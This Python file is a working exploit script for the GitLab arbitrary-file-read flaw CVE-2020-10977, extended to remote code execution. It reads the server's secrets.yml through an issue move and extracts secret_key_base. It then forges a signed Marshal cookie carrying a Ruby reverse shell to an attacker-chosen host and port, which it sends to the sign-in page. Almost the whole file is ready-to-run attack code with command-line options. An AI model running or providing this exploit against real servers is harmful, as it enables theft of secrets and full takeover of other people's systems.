import requests
from log_colors import *
import random
import argparse
import time
import hashlib
import hmac
import base64
import string
import sys
from cve_2020_10977 import CVE2020_10977

requests.packages.urllib3.disable_warnings()

# CVE-2020-10977 gitlab RCE
class CVE2020_10977_RCE(CVE2020_10977):
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, target, username, password, ip, port):
        super(CVE2020_10977_RCE, self).__init__(target, username, password)
        self.local_ip, self.port = ip, port

    # parse secret_key_base from secrets.yml file
    def parse_secret_key_base(self):
        print (LogColors.BLUE + "parse secret key base..." + LogColors.ENDC)
        if self.meow:
            s = self.meow
            secret_key_base = s[s.find("secret_key_base: ") + 17:s.find("otp_key_base") - 3]
            secret_key_base = secret_key_base.strip()
            self.secret_key_base = secret_key_base
        else:
            print (LogColors.RED + "cannot parse secrets file :(" + LogColors.ENDC)
            sys.exit()

    def ruby_magic(self):
        print (LogColors.BLUE + "generate ruby magic bytes..." + LogColors.ENDC)
        l = len(self.local_ip) + len(str(self.port)) - 8
        possible_magic_bytes = ''.join(random.choice(string.ascii_lowercase) for i in range(13))
        return possible_magic_bytes[l]

    # build payload (ruby reverse shell)
    def build_payload(self):
        print (LogColors.BLUE + "build payload..." + LogColors.ENDC)
        payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"{ruby_magic}exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
        payload = payload.replace("{ip}", self.local_ip)
        payload = payload.replace("{port}", str(self.port))
        payload = payload.replace("{ruby_magic}", self.ruby_magic())
        key = hashlib.pbkdf2_hmac(
            "sha1", password = self.secret_key_base.encode(), 
            salt=b"signed cookie", iterations=1000, dklen=64
        )
        base64_payload = base64.b64encode(payload.encode())
        digest = hmac.new(key, base64_payload, digestmod=hashlib.sha1).hexdigest()
        self.evil_cookie = base64_payload.decode() + "--" + digest
        print (LogColors.YELLOW + "successfully build payload with rev shell..." + LogColors.ENDC)
    
    # send payload by sign in (experimentation_subject_id cookie)
    def send_payload(self):
        print (LogColors.BLUE + "send payload..." + LogColors.ENDC)
        cookie = {"experimentation_subject_id" : self.evil_cookie}
        r = self.session.get(self.url + "/users/sign_in", cookies = cookie, verify = False)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload" + LogColors.ENDC)
            print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed :(" + LogColors.ENDC)
            sys.exit()

    # exploit
    def exploit(self):
        self.register()
        self.login()
        self.create_project(self.project_old)
        self.create_project(self.project_new)
        secrets = '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'
        self.create_issue(self.project_old, "secrets-kuku", secrets)
        self.move_issue(self.project_old, self.project_new, secrets)
        self.parse_secret_key_base()
        self.build_payload()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target gitlab url")
    parser.add_argument('-u','--username', required = True, help = "gitlab username")
    parser.add_argument('-p','--password', required = True, help = "gitlab password")
    parser.add_argument('-l','--lhost', required = True, help = "local host (for rev shell)")
    parser.add_argument('-P','--port', required = True, help = "local port (for rev shell)")
    args = vars(parser.parse_args())
    url = args['target']
    username, password = args["username"], args["password"]
    host, port = args["lhost"], args["port"]
    cve = CVE2020_10977_RCE(url, username, password, host, port)
    cve.exploit()
